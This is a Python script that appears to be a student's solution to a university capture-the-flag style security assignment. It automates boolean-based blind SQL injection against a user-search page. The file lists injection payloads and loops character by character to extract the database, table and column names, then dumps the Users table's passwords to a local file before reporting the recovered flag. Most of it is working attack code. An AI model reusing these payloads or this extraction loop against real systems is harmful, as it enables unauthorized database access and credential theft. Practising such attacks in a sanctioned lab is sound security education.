import requests
from urllib.parse import quote
import time
'''
step1: test for sql injection in find user page
code: ' OR 1=1 #

step2: 
yicguan' and 1=2 -- 

yicguan' and 1=1 -- 

yicguan' and (length(database()))<10 -- 

yicguan' and (length(database()))<5 -- 

yicguan' and (length(database()))<7 -- 

yicguan' and (length(database()))=6 -- 

'''
#this function is use for check the database name
def sql_injection_database_name():
    #login to the web
    d = {'user':'yicguan','pass':'yicguan'}
    session = requests.session()
    r = session.post("http://assignment-code-warriors.unimelb.life/auth.php",data = d)
    #print('response', r.text)
    database_name = ""
    #database length is 7 
    for j in range(1,7):
        #ascii from 33 to 125
        for i in range(33,125):
            inject_code = "yicguan' and ascii(substr(database(),{len},1))={asc_code} -- ".format(len=j,asc_code=i)
            print(inject_code)
            url_decode = quote(inject_code) 
            print(url_decode)    
            #time constraints
            time.sleep(2)
            req = session.get("http://assignment-code-warriors.unimelb.life//find-user.php?username="+url_decode)
            print('response', req.text)
            if req.text == "true":
                dec = int(i)
                database_name += chr(dec)
                print("the database name is ",database_name)
                break
    print("the database name is ",database_name)
    #database name is Secure
          
#sql_injection_database_name()


'''
yicguan' and (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure')<10 -- 

yicguan' and (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure')<5 -- 

yicguan' and (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure')<3 -- 

yicguan' and (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure')=3 -- 
##### Secure database has 3 tables

table_1:
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 0,1)<10 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 0,1)<5 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 0,1)<7 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 0,1)<8 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 0,1)=9 -- 
####table 1 length of name is 9

table_2:
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 1,1)<10 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 1,1)<5 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 1,1)<7 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 1,1)<6 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 1,1)=5 -- 

table_3:
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 2,1)<10 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 2,1)<5 -- 
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 2,1)<7 --
yicguan' and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='Secure' limit 2,1)=7 --
'''
def sql_injection_table_name():
    #login to the web
    print("#table:Name#")
    d = {'user':'yicguan','pass':'yicguan'}
    session = requests.session()
    r = session.post("http://assignment-code-warriors.unimelb.life/auth.php",data = d)
    #print('response', r.text)
    table2_name = ""
    #change the range base on the above finding
    for j in range(1,8):
        #ascii from 33 to 125
        for i in range(33,126):
            inject_code = "yicguan' and ascii(substr((select table_name from information_schema.TABLES where table_schema='Secure' limit 2,1),{len},1))={asc_code} -- ".format(len=j,asc_code=i)
            print(inject_code)
            url_decode = quote(inject_code) 
            print(url_decode)    
            #time constraints
            time.sleep(2)
            req = session.get("http://assignment-code-warriors.unimelb.life//find-user.php?username="+url_decode)
            print('response', req.text)
            if req.text == "true":
                dec = int(i)
                table2_name += chr(dec)
                print("the table2 name is ",table2_name)
                break
    print("the table2 name is ",table2_name)

    #table1 name is Trainings
    #table2 name is Users
    #table3 name is testing

# sql_injection_table_name()

'''
find coloum name
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Trainings') < 5 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Trainings') < 2 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Trainings') = 2 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Trainings') = 3 -- 

yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Users') < 5 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Users') < 8 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Users') < 6 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Users') < 7 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='Users') = 7 -- 

yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='testing') < 5 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='testing') < 2 -- 
yicguan' and (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='testing') = 2 -- 

'''
def sql_injection_coloum_name_length():
    #login to the web
    print("#column:Name#")
    d = {'user':'yicguan','pass':'yicguan'}
    session = requests.session()
    r = session.post("http://assignment-code-warriors.unimelb.life/auth.php",data = d)
    #print('response', r.text)
    column_length = []
    #change the range base on the above finding
    for j in range(0,2):
        for i in range(1,15):
            inject_code = "yicguan' and (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='testing'limit {len},1) = {number} -- ".format(len=j,number=i)
            print(inject_code)
            url_decode = quote(inject_code) 
            print(url_decode)    
            #time constraints
            time.sleep(2)
            req = session.get("http://assignment-code-warriors.unimelb.life//find-user.php?username="+url_decode)
            print('response', req.text)
            if req.text == "true":
                column_length.append(i)
                print("column_name_length ",column_length)
                break
    print("FINAL:column_name_length ",column_length)
    '''
    Traingings:[11,2,4]
    Users:[3,2,8,9,5,8,7]
    testing[2,3]
    '''
#sql_injection_coloum_name_length()

def sql_injection_coloum_name():
    #login to the web
    print("#column:Name#")
    d = {'user':'yicguan','pass':'yicguan'}
    session = requests.session()
    r = session.post("http://assignment-code-warriors.unimelb.life/auth.php",data = d)
    column_name = ""
    column_name_list = []
    Traingings = [11,2,4]
    Users = [3,2,8,9,5,8,7]
    testing = [2,3]
    for j in range(0,2):
        #tem = Traingings[j]
        #tem = Users[j]
        tem = testing[j]
        for k in range(1,tem+1):
            for i in range (33,126):
                inject_code = "yicguan' and ascii(substr((select column_name from information_schema.COLUMNS where TABLE_NAME= 'testing' limit {number},1),{len},1))={asc_code} -- ".format(number = j,len=k,asc_code=i)
                print(inject_code)
                url_decode = quote(inject_code)
                print(url_decode)
                time.sleep(2)
                req = session.get("http://assignment-code-warriors.unimelb.life//find-user.php?username="+url_decode)
                print('response', req.text)
                if req.text == "true":
                    dec = int(i)
                    column_name += chr(dec)
                    print("the column_name is ",column_name)
                    break
        column_name_list.append(column_name)
        column_name = ""
    print("####column_name is ",column_name_list)
          
#sql_injection_coloum_name()
'''
Traingings[Description,Id,Name]
Users[API,Id,Password,Probation,Roles,Username,Website]
testing[id,msg]
'''

'''
yicguan' and (select count(Password) from Users) >250 -- 
yicguan' and (select count(Password) from Users) >125 -- 
yicguan' and (select count(Password) from Users) >175 -- 
yicguan' and (select count(Password) from Users) >150 -- 
yicguan' and (select count(Password) from Users) >140 -- 
yicguan' and (select count(Password) from Users) >145 -- 
yicguan' and (select count(Password) from Users) =146 -- 
'''


def sql_injection_coloum_length():
    filename = 'password.txt'
    print("length of coloum")
    #login to the web
    d = {'user':'yicguan','pass':'yicguan'}
    session = requests.session()
    r = session.post("http://assignment-code-warriors.unimelb.life/auth.php",data = d)
    row_name = ""
    row_name_list = []
    #for j in range(0,147):
    for j in range(44,45):
        for i in range(1,50):
            for k in range(33,126):
                inject_code = "yicguan' and ascii(substr((select Password from Users limit {row} ,1),{len},1))={asc_code} -- ".format(row = j ,len = i,asc_code=k)
                print(inject_code)
                url_decode = quote(inject_code)
                print(url_decode)
                time.sleep(2)
                req = session.get("http://assignment-code-warriors.unimelb.life//find-user.php?username="+url_decode)
                print('response', req.text)
                if req.text == "true":
                    dec = int(k)
                    row_name += chr(dec)
                    print("the row_data is ",row_name)
                    break
        row_name_list.append(row_name)
        f = open(filename,'a')
        f.write(row_name)
        f.write("$$$$$")
        tem = str(j)
        f.write(tem)
        f.write("\n")
        row_name = ""
    print("####row_data is ",row_name_list)

sql_injection_coloum_length()
'''
find "FLAG" at row 45
update function and find the FLAG{hacking_blind_is_still_effective!}

'''